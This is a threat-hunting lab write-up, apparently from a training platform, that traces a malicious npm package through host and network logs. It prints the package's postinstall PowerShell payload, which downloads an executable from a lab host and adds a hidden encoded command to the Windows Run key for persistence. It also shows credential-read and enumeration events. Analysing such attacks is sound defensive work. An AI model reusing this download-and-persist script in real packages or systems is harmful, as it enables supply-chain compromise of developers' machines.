---
{"dg-publish":true,"permalink":"/simmering/health-hazard-threat-hunting/","tags":["blue-team"]}
---

~ [[input\|input]]

# Health Hazard

### Briefing

After months of juggling content calendars and caffeine-fueled brainstorming, co-founder Tom Whiskers finally carved out time to build the company’s first website. It was supposed to be simple: follow a tutorial, install a few packages, and bring the brand to life with lightweight JavaScript magic.

But between sleepless nights and copy-pasted code, Tom started feeling off. Not sick exactly, just off. The terminal scrolled with reassuring green text, the site loaded fine, and everything looked normal.

But no one really knows what might have been hidden beneath it all…

It just waited.

### Hypothesis

An attacker may have leveraged a compromised third-party software package to gain initial access to the system and silently stage a payload for later execution. They likely established persistence to maintain access without immediate detection.

### Threat Hunting Mission
---

Your task as a Threat Hunter is to conduct a comprehensive hunting session in the TryGovMe environment to identify potential anomalies and threats. You are expected to:

**1. Validate a Hunting Hypothesis**

Investigate the given hypothesis and determine - based on your findings - whether it is valid or not.

**2. Review IOCs from External Sources**

Analyse the list of Indicators of Compromise provided by security teams from compromised partner organisations. These may lead you to uncover additional malicious activity or pivot points.

**3. Reconstruct the Attack Chain**

Perform a detailed investigation within the environment and reconstruct the attack chain, starting from the initial point of compromise to the attacker's final objective.

**4. Determine the Scope of the Incident**

Identify the impacted users, systems, and assets. Understanding the full scope is critical for response and containment.

**5. Generate a Final Threat Hunting Report**

Based on your findings and the reconstructed attack chain, compile a final Threat Hunting report highlighting the key observations and affected entities.

---

## Host-Based IOCs

| **Type**             | **Value**                                                |
| -------------------- | -------------------------------------------------------- |
| NPM Package          | `healthchk-lib@1.0.1`                                    |
| Registry Path        | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`     |
| Registry Value Name  | `Windows Update Monitor`                                 |
| Registry Value Data  | `powershell.exe -NoP -W Hidden -EncodedCommand <base64>` |
| Downloaded File Path | `%APPDATA%\SystemHealthUpdater.exe`                      |
| PowerShell Command   | `Invoke-WebRequest -Uri ... -OutFile ...`                |
| Process Execution    | `powershell.exe -NoP -W Hidden -EncodedCommand ...`      |
| Script Artifact      | Found in `package.json` under `"postinstall"`            |

## Network-Based IOCs

| **Type**           | **Value**                                                  |
| ------------------ | ---------------------------------------------------------- |
| Download URL       | `http://global-update.wlndows.thm/SystemHealthUpdater.exe` |
| Hostname Contacted | `global-update.wlndows.thm`                                |
| Protocol           | HTTP (unencrypted)                                         |
| Port               | 80                                                         |
| Traffic Behavior   | Outbound file download to `%APPDATA%` via PowerShell       |

External sources proves that right after installation of npm packages, it makes a request to 'global-update.wlndows.thm' to download a malicious executable and this executable is added to the Run registry for persistence mechanism:

 timestamp: 21/06/2025 10:58:27.000
```C
$dest = "$env:APPDATA\SystemHealthUpdater.exe"
$url = "http://global-update.wlndows.thm/SystemHealthUpdater.exe"

# Download file
Invoke-WebRequest -Uri $url -OutFile $dest

# Base64 encode the command
$encoded = [Convert]::ToBase64String(
    [Text.Encoding]::Unicode.GetBytes("Start-Process '$dest'")
)

# Build persistence command
$runCmd = 'powershell.exe -NoP -W Hidden -EncodedCommand ' + $encoded

# Add to registry for persistence
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
    -Name 'Windows Update Monitor' -Value $runCmd
```

Filtering for `npm`, we can also see the malicious package being installed:

timestamp: 21/06/2025 10:58:24.000
```C
"C:\Program Files\nodejs\node.exe" "C:\Program Files\nodejs/node_modules/npm/bin/npm-cli.js" install healthchk-lib@1.0.1
```

Based on analysis and ParentCommandLine, the malicious npm package installation goes first then the installation of SystemHealthUpdater.exe comes next.


It looks like this is the user responsible for installing this packages

```C
ParentUser: PAW-TOM\itadmin-tom
```

With computer name of : ComputerName: paw-tom

```
TargetFilename: C:\Development\node_modules\healthchk-lib\scripts\postinstall.ps1
```

Then there is evidence that the user tom read credentials from the credentials manager:

```C
Account_Domain: PAW-TABITHA  
   Account_Name: itadmin-tom  
   ComputerName: paw-tabitha  
   Error_Code: -  
   EventCode: 5379  
   EventType: 0  
   Keywords: Audit Success  
   LogName: Security  
   Logon_ID: 0x6A7BB  
   Message: Credential Manager credentials were read. Subject: Security ID: S-1-5-21-1966530601-3185510712-10604624-500 Account Name: itadmin-tom Account Domain: PAW-TABITHA Logon ID: 0x6A7BB Read Operation: Enumerate Credentials
```

From computername: paw-tabitha there were signs of host enumeration indicating a successful lateral movement:

```C
C:\Windows\system32\cmd.exe /c C:\Windows\system32\reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64

C:\Windows\system32\reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64

wmic OS get OperatingSystemSKU /format:list

powershell "Get-CimInstance Win32_PnPEntity | Where-Object { $_.Service -eq 'xenvbd' } | Select-Object DeviceID | ConvertTo-Json -Depth 3"

powershell "Get-ItemProperty -Path 'HKLM:\SOFTWARE\Amazon\PVDriver' | Select-Object Name, Version | ConvertTo-Json -Depth 3"

taskhostw.exe SYSTEM

powershell "Get-CimInstance Win32_OperatingSystem | Select-Object Version, OperatingSystemSKU | ConvertTo-Json -Depth 3"
```

  timestamp: 21/06/2025 10:53:04.000



* ComputerName="paw-tabitha" app="win:remote"

```C
Logon_Type: 10 Message: An account was successfully logged on. Subject: Security ID: S-1-5-18 Account Name: PAW-TABITHA$ Account Domain: WORKGROUP Logon ID: 0x3E7 Logon Information: Logon Type: 10 Restricted Admin Mode: No Virtual Account: No Elevated Token: Yes Impersonation Level: Impersonation New Logon: Security ID: S-1-5-21-1966530601-3185510712-10604624-500 Account Name: itadmin-tom Account Domain: PAW-TABITHA Logon ID: 0x6A7BB Linked Logon ID: 0x0 Network Account Name: - Network Account Domain: - Logon GUID: {00000000-0000-0000-0000-000000000000} Process Information: Process ID: 0x554 Process Name: C:\Windows\System32\svchost.exe Network Information: Workstation Name: PAW-TABITHA Source Network Address: 194.50.16.198 Source Port: 0 Detailed Authentication Information: Logon Process: User32 Authentication Package: Negotiate Transited Services: - Package Name (NTLM only): - Key Length: 0 This event is generated when a logon session is created. It is generated on the computer that was accessed. The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe. The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network). The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on. The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases. The impersonation level field indicates the extent to which a process in the logon session can impersonate. The authentication information fields provide detailed information about this specific logon request. - Logon GUID is a unique identifier that can be used to correlate this event with a KDC event. - Transited services indicate which intermediate services have participated in this logon request. - Package name indicates which sub-protocol was used among the NTLM protocols. - Key length indicates the length of the generated session key. This will be 0 if no session key was requested
```